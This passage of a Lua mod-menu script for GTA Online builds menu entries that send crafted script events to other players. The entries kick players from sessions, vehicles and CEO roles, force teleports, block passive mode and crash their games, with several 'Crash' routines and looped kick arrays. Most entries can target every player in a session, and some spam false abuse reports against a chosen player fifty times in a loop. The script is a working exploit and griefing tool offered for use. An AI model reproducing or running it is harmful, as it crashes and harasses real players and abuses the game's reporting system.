                ped_to_kidnap = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
                ped_to_drive = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
                ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
                ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(
                    table_kidnap[veh_to_attach],
                    ped_to_kidnap,
                    0,
                    0,
                    1,
                    -1,
                    0,
                    0,
                    0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    false
                )
                ENTITY.SET_ENTITY_COORDS(
                    ped_to_kidnap,
                    coords_ped.x,
                    coords_ped.y,
                    coords_ped.z - 1,
                    false,
                    false,
                    false,
                    false
                )
                PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
                TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
                util.yield(500)
                delet_entity(ped_to_kidnap)
                veh_to_attach = veh_to_attach + 1
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
            end
        end
    )
    menu.action(
        objevents,
        "Clean",
        {},
        "",
        function(aR)
            for aT = 1, #table_ladder do
                delet_entity(table_ladder[aT])
            end
            for aT = 1, #veh_attach do
                delet_entity(veh_attach[aT])
            end
        end
    )
    kick1 =
        menu.list(
        kickevents,
        "Kick 1",
        {},
        "",
        function()
        end
    )
    kick2 =
        menu.list(
        kickevents,
        "Kick 2",
        {},
        "",
        function()
        end
    )
    kick3 =
        menu.list(
        kickevents,
        "Kick 3",
        {},
        "",
        function()
        end
    )
    kick4 =
        menu.list(
        kickevents,
        "Kick 4",
        {},
        "May not work",
        function()
        end
    )
    kick5 =
        menu.list(
        kickevents,
        "Kick 5",
        {},
        "",
        function()
        end
    )
    kick6 =
        menu.list(
        kickevents,
        "Kick 6",
        {},
        "",
        function()
        end
    )
    netevents =
        menu.list(
        selcplyr,
        "Net Events",
        {},
        "",
        function()
        end
    )
    crashevents =
        menu.list(
        selcplyr,
        "Crash Events",
        {},
        "",
        function()
        end
    )
    menu.toggle(
        eventarrays,
        "Event Array 1",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick1Type1(pid)
                Kick1Type2(pid)
                Kick1Type3(pid)
            end
        end
    )
    menu.toggle(
        eventarrays,
        "Event Array 2",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick2Type1(pid)
                Kick2Type2(pid)
                Kick2Type3(pid)
            end
        end
    )
    menu.toggle(
        eventarrays,
        "Event Array 3",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick3Type1(pid)
                Kick3Type2(pid)
                Kick3Type3(pid)
            end
        end
    )
    menu.toggle(
        eventarrays,
        "Event Array 4",
        {},
        "May not work",
        function(ac)
            if pid ~= players.user() and ac then
                Kick4Type1(pid)
                Kick4Type2(pid)
                Kick4Type3(pid)
            end
        end
    )
    menu.toggle(
        eventarrays,
        "Event Array 5",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                KickV1(pid, 99999)
                KickV2(pid, 9999999)
                KickV3(pid, 99999)
                KickV4(pid, 9999999)
                KickV6(pid, 99999)
                NetKick1(pid, 400)
                NetKick2(pid, 400)
                NetKick3(pid, 400)
                NetKick4(pid)
            end
        end
    )
    menu.toggle(
        eventarrays,
        "Event Array 6",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick6Type1(pid)
                Kick6Type2(pid)
                Kick6Type3(pid)
            end
        end
    )
    menu.toggle(
        eventarrays,
        "Event Array 7",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                CEOSpam(pid)
                AptSpam(pid)
                NetSpam(pid)
            end
        end
    )
    menu.toggle(
        eventarrays,
        "Event Array All",
        {},
        "Just Fucking Slams Ozark Users With Script Events And Crashes Their Game",
        function(ac)
            if pid ~= players.user() and ac then
                Kick1Type1(pid)
                Kick1Type2(pid)
                Kick1Type3(pid)
                Kick2Type1(pid)
                Kick2Type2(pid)
                Kick2Type3(pid)
                Kick3Type1(pid)
                Kick3Type2(pid)
                Kick3Type3(pid)
                Kick4Type1(pid)
                Kick4Type2(pid)
                Kick4Type3(pid)
                Kick6Type1(pid)
                Kick6Type2(pid)
                Kick6Type3(pid)
                NetKick1(pid, 400)
                NetKick2(pid, 400)
                NetKick3(pid, 400)
                NetKick4(pid)
                KickV1(pid, 99999)
                KickV2(pid, 9999999)
                KickV3(pid, 99999)
                KickV4(pid, 9999999)
                KickV6(pid, 99999)
                CEOSpam(pid)
                AptSpam(pid)
                NetSpam(pid)
            end
        end
    )
    menu.toggle(
        kick1,
        "Kick 1 Type 1",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick1Type1(pid)
            end
        end
    )
    menu.toggle(
        kick1,
        "Kick 1 Type 2",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick1Type2(pid)
            end
        end
    )
    menu.toggle(
        kick1,
        "Kick 1 Type 3",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick1Type3(pid)
            end
        end
    )
    menu.toggle(
        kick2,
        "Kick 2 Type 1",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick2Type1(pid)
            end
        end
    )
    menu.toggle(
        kick2,
        "Kick 2 Type 2",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick2Type2(pid)
            end
        end
    )
    menu.toggle(
        kick2,
        "Kick 2 Type 3",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick2Type3(pid)
            end
        end
    )
    menu.toggle(
        kick3,
        "Kick 3 Type 1",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick3Type1(pid)
            end
        end
    )
    menu.toggle(
        kick3,
        "Kick 3 Type 2",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick3Type2(pid)
            end
        end
    )
    menu.toggle(
        kick3,
        "Kick 3 Type 3",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick3Type3(pid)
            end
        end
    )
    menu.toggle(
        kick4,
        "Kick 4 Type 1",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick4Type1(pid)
            end
        end
    )
    menu.toggle(
        kick4,
        "Kick 4 Type 2",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick4Type2(pid)
            end
        end
    )
    menu.toggle(
        kick4,
        "Kick 4 Type 3",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick4Type3(pid)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 1",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                NetKick1(pid, 400)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 2",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                NetKick2(pid, 400)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 3",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                NetKick3(pid, 400)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 4",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                NetKick4(pid)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 5",
        {},
        "Represents looped Kick V1",
        function(ac)
            if pid ~= players.user() and ac then
                KickV1(pid, 9999)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 6",
        {},
        "Represents looped Kick V2",
        function(ac)
            if pid ~= players.user() and ac then
                KickV2(pid, 999999)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 7",
        {},
        "Represents looped Kick V3",
        function(ac)
            if pid ~= players.user() and ac and ac then
                KickV3(pid, 999999)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 8",
        {},
        "Represents looped Kick V4",
        function(ac)
            if pid ~= players.user() and ac and ac then
                KickV4(pid, 999999)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 9",
        {},
        "Represents looped Kick V5",
        function(ac)
            if pid ~= players.user() and ac and ac then
                NetKick1(pid, 400)
                NetKick2(pid, 400)
                NetKick3(pid, 400)
                NetKick4(pid, 400)
            end
        end
    )
    menu.toggle(
        kick5,
        "Kick 5 Type 10",
        {},
        "Represents looped Kick V6",
        function(ac)
            if pid ~= players.user() and ac and ac then
                KickV6(pid, 9999)
            end
        end
    )
    menu.toggle(
        kick6,
        "Kick 6 Type 1",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick6Type1(pid)
            end
        end
    )
    menu.toggle(
        kick6,
        "Kick 6 Type 2",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick6Type2(pid)
            end
        end
    )
    menu.toggle(
        kick6,
        "Kick 6 Type 3",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                Kick6Type3(pid)
            end
        end
    )
    menu.action(
        netevents,
        "踢出车辆",
        {},
        "",
        function()
            local Q = PLAYER.GET_PLAYER_PED(pid)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(Q)
            util.trigger_script_event(1 << pid, {0xB0886E20, 0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
        end
    )
    menu.action(
        netevents,
        "踢出CEO",
        {},
        "",
        function()
            util.trigger_script_event(1 << pid, {0xD3FE818F, 0, 1, 5, 0})
        end
    )
    menu.action(
        netevents,
        "CEO Dismiss",
        {},
        "",
        function()
            util.trigger_script_event(1 << pid, {0x9DB77399, 0, 1, 5})
        end
    )
    menu.action(
        netevents,
        "CEO Terminate",
        {},
        "",
        function()
            util.trigger_script_event(1 << pid, {0x9DB77399, 1, 1, 6})
            util.trigger_script_event(1 << pid, {0x9DB77399, 0, 1, 6, 0})
        end
    )
    menu.action(
        netevents,
        "Apartment Invite",
        {},
        "",
        function(a2)
            if pid ~= players.user() then
                arg = math.random(-2147483647, 2147483647)
                util.trigger_script_event(1 << pid, {-171207973, arg, pid, -1, 1, -1, 1, 1, 1})
                util.trigger_script_event(1 << pid, {0xf5cb92db, 24, 24, 1, 0, arg, 1, 1, 1})
                util.trigger_script_event(1 << pid, {-171207973, 24, 24, 1, 0, arg, 1, 1, 1})
            end
        end
    )
    menu.action(
        netevents,
        "Send to Mission",
        {},
        "",
        function(a2)
            if pid ~= players.user() then
                send_script_event(-545396442, pid, C(pid))
                send_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(-545396442, pid, C(pid))
                send_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(-545396442, pid, C(pid))
                send_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(-545396442, pid, C(pid))
                send_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(-545396442, pid, C(pid))
                send_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(-545396442, pid, C(pid))
                send_script_event(-545396442, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
            end
        end
    )
    menu.action(
        netevents,
        "Send to Island",
        {},
        "",
        function(a2)
            if pid ~= players.user() then
                send_script_event(1300962917, pid, {pid, 1300962917, 0, 0})
                send_script_event(1300962917, pid, C(pid))
                send_script_event(1300962917, pid, {pid, 1300962917, 0, 0})
                send_script_event(1300962917, pid, C(pid))
                send_script_event(1300962917, pid, {pid, 1300962917, 0, 0})
                send_script_event(1300962917, pid, C(pid))
                send_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(1300962917, pid, C(pid))
                send_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(1300962917, pid, C(pid))
                send_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(1300962917, pid, C(pid))
                send_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(1300962917, pid, C(pid))
                send_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(1300962917, pid, C(pid))
                send_script_event(1300962917, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
            end
        end
    )
    menu.action(
        netevents,
        "Insurance Error",
        {},
        "",
        function(a2)
            if pid ~= players.user() then
                send_script_event(1302185744, pid, C(pid))
                send_script_event(1302185744, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(891272013, pid, C(pid))
                send_script_event(891272013, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(1302185744, pid, C(pid))
                send_script_event(1302185744, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(891272013, pid, C(pid))
                send_script_event(891272013, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(1302185744, pid, C(pid))
                send_script_event(1302185744, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
                send_script_event(891272013, pid, C(pid))
                send_script_event(891272013, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
            end
        end
    )
    menu.action(
        netevents,
        "禁止语音聊天",
        {},
        "May lag your game when in progress",
        function(a2)
            if pid ~= players.user() then
                for U = 1, 30 do
                    menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
                    util.yield()
                end
            end
        end
    )
    menu.action(
        netevents,
        "Report Spam",
        {},
        "May lag your game when in progress",
        function(a2)
            if pid ~= players.user() then
                for U = 1, 50 do
                    menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
                    util.yield()
                end
            end
        end
    )
    menu.toggle(
        netevents,
        "Net Spam",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                NetSpam(pid)
            end
        end
    )
    menu.toggle(
        netevents,
        "Vehicle Kick Spam",
        {},
        "",
        function(ac)
            if pid ~= players.user() and ac then
                VehKickSpam(pid)
            end
        end
    )
    passivemode =
        menu.list(
        netevents,
        "Passive Mode",
        {},
        "",
        function()
        end
    )
    menu.action(
        passivemode,
        "Block",
        {},
        "",
        function(ac)
            if players.exists(pid) then
                send_script_event(-909357184, pid, {pid, 1})
                send_script_event(-909357184, pid, {pid, 1})
            end
        end
    )
    menu.action(
        passivemode,
        "Unblock",
        {},
        "",
        function(ac)
            if players.exists(pid) then
                send_script_event(-909357184, pid, {pid, 0})
                send_script_event(-909357184, pid, {pid, 0})
            end
        end
    )
    menu.action(
        crashevents,
        "Array Crash V1",
        {},
        "",
        function(aM)
            if pid ~= players.user() and players.exists(pid) then
                EventArray(pid, 180, -1949011582)
                notification("Array Crash V1 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
                util.yield(12000)
                if not players.exists(pid) then
                    util.toast(a0[math.random(1, 13)], TOAST_ABOVE_MAP)
                    notification("Player left", true, false)
                else
                    util.toast("Not resolved :(", TOAST_ABOVE_MAP)
                    notification("Player did not leave, probably the crash got blocked", true, false)
                end
            end
        end
    )
    menu.action(
        crashevents,
        "Array Crash V2",
        {},
        "",
        function(aM)
            if pid ~= players.user() and players.exists(pid) then
                EventArray(pid, 240, Z[math.random(1, 6)])
                EventArray(pid, 240, -1949011582)
                notification("Array Crash V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
                util.yield(12000)
                if not players.exists(pid) then
                    util.toast(a0[math.random(1, 13)], TOAST_ABOVE_MAP)
                    notification("Player left", true, false)
                else
                    util.toast("Not resolved :(", TOAST_ABOVE_MAP)
                    notification("Player did not leave, probably the crash got blocked", true, false)
                end
            end
        end
    )
    menu.action(
        crashevents,
        "Event Crash",
        {},
        "",
        function(a2)
            if pid ~= players.user() and players.exists(pid) then
                Crash(pid)
                notification("Event Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
                util.yield(12000)
                if not players.exists(pid) then
                    util.toast(a0[math.random(1, 13)], TOAST_ABOVE_MAP)
                    notification("Player left", true, false)
                else
                    util.toast("Not resolved :(", TOAST_ABOVE_MAP)
                    notification("Player did not leave, probably the crash got blocked", true, false)
                end
            end
        end
    )
    menu.action(
        crashevents,
        "Village People 360 Crash",
        {},
        "Stay away from the target",
        function()
            if pid ~= players.user() and players.exists(pid) and not aU then
                aU = true
                pedhash = 0xD266D9D6
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                notification("Village People 360 Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
                local bh = PLAYER.GET_PLAYER_PED(pid)
                local bi = ENTITY.GET_ENTITY_COORDS(bh, true)
                local bj = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                local bk = {}
                local bf = bi
                bf.x = bf.x
                bf.y = bf.y
                bf.z = bf.z
                for U = 1, 150 do
                    bk[U] = util.create_ped(28, pedhash, bf, bj)
                    util.yield(25)
                end
                notification("Done sending", true, true)
                util.yield(3000)
                notification("Cleaning up", true, true)
                for U = 1, 150 do
                    delet_entity(bk[U])
                    util.yield(25)
                end
                notification("Done cleaning up", true, true)
                util.yield(9000)
                if not players.exists(pid) then
                    util.toast(a0[math.random(1, 13)], TOAST_ABOVE_MAP)
                    notification("Player left", true, false)
                end
                util.yield(100)
                aU = false
            end
            if aU then
                notification("You have another crash in progress, please wait", true, true)
            end
        end
    )
    menu.action(
        crashevents,
        "KFC Crash",
        {},
        "Stay away from the target",
        function()
            if pid ~= players.user() and players.exists(pid) and not aU then
                aU = true
                pedhash = 0x45463A0D
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                notification("KFC Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
                local bh = PLAYER.GET_PLAYER_PED(pid)
                local bi = ENTITY.GET_ENTITY_COORDS(bh, true)
                local bj = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                local bk = {}
                local bf = bi
                bf.x = bf.x
                bf.y = bf.y
                bf.z = bf.z
                for U = 1, 175 do
                    bk[U] = util.create_ped(28, pedhash, bf, bj)
                    util.yield(25)
                end
                notification("Done sending", true, true)
                util.yield(3000)
                notification("Cleaning up", true, true)
                for U = 1, 175 do
                    delet_entity(bk[U])
                    util.yield(25)
                end
                notification("Done cleaning up", true, true)
                util.yield(9000)
                if not players.exists(pid) then
                    util.toast(a0[math.random(1, 13)], TOAST_ABOVE_MAP)
                    notification("Player left", true, false)
                end
                util.yield(100)
                aU = false
            end
            if aU then
                notification("You have another crash in progress, please wait", true, true)
            end
        end
    )
    kickeventall =
        menu.list(
        allplyrs,
        "Kick Events",
        {},
        "",
        function()
        end
    )
    menu.action(
        kickeventall,
        "Kick V1",
        {"kickv1all"},
        "Works on Cherax",
        function()
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    KickV1(pids, 2)
                    notification("Kick V1 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                end
            end
        end
    )
    menu.action(
        kickeventall,
        "Kick V2",
        {"kickv2all"},
        "Works on Cherax",
        function()
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    KickV2(pids, 2)
                    notification("Kick V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                end
            end
        end
    )
    neteventsall =
        menu.list(
        allplyrs,
        "Net Events",
        {},
        "",
        function()
        end
    )
    menu.action(
        neteventsall,
        "踢出车辆",
        {"vehkickall"},
        "",
        function()
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    local Q = PLAYER.GET_PLAYER_PED(pids)
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(Q)
                    util.trigger_script_event(1 << pids, {0xB0886E20, 0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
                end
            end
        end
    )
    menu.action(
        neteventsall,
        "踢出CEO",
        {"ceobanall"},
        "",
        function()
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    util.trigger_script_event(1 << pids, {0xD3FE818F, 0, 1, 5, 0})
                end
            end
        end
    )
    menu.action(
        neteventsall,
        "Apartment Invite",
        {"aptinvall"},
        "",
        function()
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    arg = math.random(-2147483647, 2147483647)
                    util.trigger_script_event(1 << pids, {-171207973, arg, pids, -1, 1, -1, 1, 1, 1})
                    util.trigger_script_event(1 << pids, {0xf5cb92db, 24, 24, 1, 0, arg, 1, 1, 1})
                    util.trigger_script_event(1 << pids, {-171207973, 24, 24, 1, 0, arg, 1, 1, 1})
                end
            end
        end
    )
    menu.toggle(
        neteventsall,
        "Vehicle Kick Spam",
        {"vehkickspamall"},
        "",
        function(ac)
            if ac then
                for pids = 0, 32 do
                    if players.exists(pids) and pids ~= players.user() then
                        VehKickSpam(pids)
                    end
                end
            end
        end
    )
    passivemodeall =
        menu.list(
        neteventsall,
        "Passive Mode",
        {},
        "",
        function()
        end
    )
    menu.action(
        passivemodeall,
        "Block",
        {"blockpassiveall"},
        "",
        function(ac)
            for pids = 0, 32 do
                if pids ~= players.user() and players.exists(pids) then
                    send_script_event(-909357184, pids, {pids, 1})
                    send_script_event(-909357184, pids, {pids, 1})
                end
            end
        end
    )
    menu.action(
        passivemodeall,
        "Unblock",
        {"unblockpassiveall"},
        "",
        function(ac)
            for pids = 0, 32 do
                if pids ~= players.user() and players.exists(pids) then
                    send_script_event(-909357184, pids, {pids, 0})
                    send_script_event(-909357184, pids, {pids, 0})
                end
            end
        end
    )
    crasheventsall =
        menu.list(
        allplyrs,
        "Crash Events",
        {},
        "",
        function()
        end
    )
    menu.action(
        crasheventsall,
        "Array Crash V1",
        {"arraycrashv1all"},
        "",
        function(aM)
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    EventArray(pids, 180, -1949011582)
                    notification("Array Crash V1 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                end
            end
        end
    )
    menu.action(
        crasheventsall,
        "Array Crash V2",
        {"arraycrashv2all"},
        "",
        function(aM)
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    EventArray(pids, 240, Z[math.random(1, 6)])
                    EventArray(pids, 240, -1949011582)
                    notification("Array Crash V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                end
            end
        end
    )
    menu.action(
        crasheventsall,
        "Event Crash",
        {"eventcrashall"},
        "",
        function(aM)
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    Crash(pids)
                    notification("Event Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                end
            end
        end
    )
end
local bl = true
if au then
    newjoiners =
        menu.list(
        menu.my_root(),
        "new entrant",
        {},
        "",
        function()
        end
    )
    local bl = true
    menu.toggle(
        newjoiners,
        "Disable passive mode",
        {"blockpassivenewjoiners"},
        "Send passive blocking events to each player when you join a turn or when they join you",
        function(ac)
            if ac then
                bl = true
            else
                bl = false
            end
        end,
        true
    )
    local bl = true
end
if au then
    for pid = 0, 32 do
        if players.exists(pid) then
            GenerateFeatures(pid)
        end
    end
    players.on_join(
        function(pid)
            if bl then
                for U = 1, 5 do
                    if pid ~= players.user() then
                        util.yield(90000)
                        util.trigger_script_event(1 << pid, {-909357184, pid, 1})
                        util.trigger_script_event(1 << pid, {-909357184, pid, 1})
                    end
                end
                if players.exists(pid) then
                    notification(
                        "Block Passive has been automatically sent to " .. PLAYER.GET_PLAYER_NAME(pid),
                        true,
                        false
                    )
                end
            end
        end
    )
    players.on_join(GenerateFeatures)
    players.on_leave(update_leave)
    players.on_join(update_join)
end
local bm = util.current_time_millis()
local bn = false
if au then
    while true do
        if aJ then
            vehicles = util.get_all_vehicles()
            cur_players = players.list(true, true, true)
            for bo, a2 in pairs(vehicles) do
                driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(a2, -1)
                if PED.GET_PED_TYPE(driver) > 4 then
                    VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(a2, false, true)
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(a2, aL)
                    VEHICLE.SET_VEHICLE_GRAVITY(a2, aK)
                end
            end
        end
        util.yield()
    end
end
